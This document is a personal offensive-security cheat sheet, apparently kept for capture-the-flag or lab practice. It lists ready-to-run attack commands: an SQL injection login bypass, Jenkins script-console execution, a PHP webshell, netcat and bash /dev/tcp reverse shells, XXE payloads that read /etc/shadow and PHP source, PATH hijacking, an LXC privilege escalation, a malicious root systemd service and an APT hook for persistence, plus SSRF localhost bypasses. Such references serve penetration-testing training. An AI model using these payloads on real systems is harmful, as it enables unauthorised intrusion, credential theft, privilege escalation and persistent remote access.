Commands for exploits
---

## SQL Injection

```
php sql injection
---
$sql="SELECT * FROM users WHERE username='$username' AND password='$password'";


EXPLOIT:
username = admin'#
```

## Jenkins RCE

Go "Mangage Jenkins" -> "Script Console"

```
def proc = "cat root/flag.txt".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

## WEBSHELLS

Upload these on the server

```
php
---
<?php echo system($_REQUEST['cmd']);?>

shell stabilization
---
python3 -c "import pty;pty.spawn('/bin/bash');"

```

## NC REVERSE SHELLS

General nc commands for reverse shells

```
nc listen on attacker
---
nc -lnvp <port>


nc commands on victim (URL encode pls)
---
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <addr> <port> >/tmp/f
rm -f /tmp/p; mknod /tmp/p p && nc <addr> <port> 0/tmp/p
bash -c 'bash -i >& /dev/tcp/<addr>/<port> 0>&1' <--best

```


## XML ATTACKS

```
LFI
---
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ac SYSTEM "file:///etc/shadow"> ]>
                <bugreport>
                <title>&ac;</title>
                <cwe>a</cwe>
                <cvss>a</cvss>
                <reward>a</reward>
                </bugreport>

reading php files
---
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php">]>
                <bugreport>
                <title>&ac;</title>
                <cwe>a</cwe>
                <cvss>a</cvss>
                <reward>a</reward>
                </bugreport>
```

## PYTHON ATTACKS

```
eval
---
you can chain eval commands with a comma

eval("25+1,print('hello!')"

os.system
---
inject commands with $()

$(ls)
```

## ENV BINARY INJECTION

```
create our own binary, and prepend to PATH
scripts will now look for our binary and execute it
---
echo "commands" > /home/user/binary_name

export PATH=/home/user:$PATH
```

## Website enumeration

- using burpsuite
- go to the website using the proxy
- go the HTTP traffic
- add the request to scope

## LXC

```
1. get the image and build it
---
https://github.com/saghul/lxd-alpine-builder

2. bring the image over to the victim
---
python3 -m http.server

3.  import the image
---
lxc image import ./alpine-v3.13-x86_64-20210506_2203.tar.gz --alias privesc

4. mount the image with privileges, and run it
---
lxc init privesc privcontainer -c security.privileged=true
lxc config device add privcontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start privcontainer
lxc exec privcontainer /bin/sh

```

## BAD SERVICE

```
/dev/shm/root.service
---
[Unit]
Description=pwned

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'

[Install]
WantedBy=multi-user.target
---


systemctl enable /dev/shm/root.service
systemctl start root.service
```

## APT run comamnds

```
run commands after apt update
---
$ echo "APT::Update::Pre-Invoke {'whoami'};" > 00command
$ mv 00command /etc/apt/apt.conf.d/00command
```


## SSRF

```
https://www.neuralegion.com/blog/ssrf-server-side-request-forgery/#ssrf-bypass


http://0177.0.0.1/ --> (127.0.0.1)
http://2130706433/ --> (127.0.0.1)
http://[::]/
http://0000::1:80/
http://127.1/
http://127.0.1/
http://0/

Play around with caps
```
